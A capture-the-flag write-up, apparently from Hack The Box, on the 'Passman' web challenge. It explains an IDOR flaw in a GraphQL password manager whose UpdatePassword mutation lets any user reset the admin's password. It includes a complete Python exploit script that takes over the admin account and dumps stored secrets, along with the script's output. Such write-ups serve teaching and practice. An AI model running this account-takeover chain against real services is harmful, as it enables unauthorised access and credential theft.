# [Web - easy] Passman

This challenge starts with a JS webapp connecting to a MySQL database. The webapp serves as a GraphQL interface between a client and the MySQL database to: `RegisterUser`, `LoginUser`, `UpdatePassword`, `AddPhrase` and `getPhraseList`. This database is supposed to serve as a password manager, storing passwords.

The main vulnerability lies in the fact that the `UpdatePassword` GraphQL mutation does not check for which user the password is updated: it is possible to update the admin password with any user. That's called an IDOR (Insecure Direct Object Reference).

As such, the flow to get the flag is (using only the GraphQL API):

- register a new user
- login with this user, getting the JWT in exchange
- using the authenticated session with the JWT cookie, update the admin password
- login as admin and its now known password, getting the JWT in exchange
- with the admin session, list the admin passwords, get the flag

The full script is the following:

```python
import requests
import json

domain = '165.232.98.11'
endpoint = 'http://{}:31043/graphql'.format(domain)
username = 'bbb'
email = 'aaa@aa.aa'
password = 'aaa'

register = {
    'query': 'mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }',
    'variables': {
        'username': username,
        'email': email,
        'password': password
    }
}

login = {
    'query': 'mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }',
    'variables': {
        'username': username,
        'password': password
    }
}

get_passwords = {
    'query': '{ getPhraseList { id, owner, type, address, username, password, note } }'
}

update_pass = {
    'query': 'mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }',
    'variables': {
        'username': 'admin',
        'password': password
    }
}

login_admin = {
    'query': 'mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }',
    'variables': {
        'username': 'admin',
        'password': password
    }
}


s = requests.Session()
# Register
response = s.post(endpoint, json = register)
print(response.text)
# Login
response = s.post(endpoint, json = login)
token = json.loads(response.text)
print(token)
s.cookies.set("session", token['data']['LoginUser']['token'], domain=domain)

# Update admin password
response = s.post(endpoint, json = update_pass)
print(response.text)

# Login admin
response = s.post(endpoint, json = login_admin)
token = json.loads(response.text)
print(token)
s.cookies.set("session", token['data']['LoginUser']['token'], domain=domain)
# Get passwords
response = s.post(endpoint, json = get_passwords)
print(response.text)
```

The output is now:

```bash
$ python lol.py
{"data":{"RegisterUser":{"message":"User registered successfully!"}}}
{'data': {'LoginUser': {'message': 'User logged in successfully!', 'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJiYiIsImlzX2FkbWluIjowLCJpYXQiOjE2Nzk3Mjc1MzB9.fzUOGc0DQeVLMYr04dGveszWmzVqJBs9g-Jju57ds6k'}}}
{"data":{"UpdatePassword":{"message":"Password updated successfully!"}}}
{'data': {'LoginUser': {'message': 'User logged in successfully!', 'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlhdCI6MTY3OTcyNzUzMX0.red-2ntZCxVGDTv6MlrvQCwSFSJGya3VDE0SismI1hQ'}}}
{"data":{"getPhraseList":[{"id":"1","owner":"admin","type":"Web","address":"igms.htb","username":"admin","password":"HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}","note":"password"}]}}
```
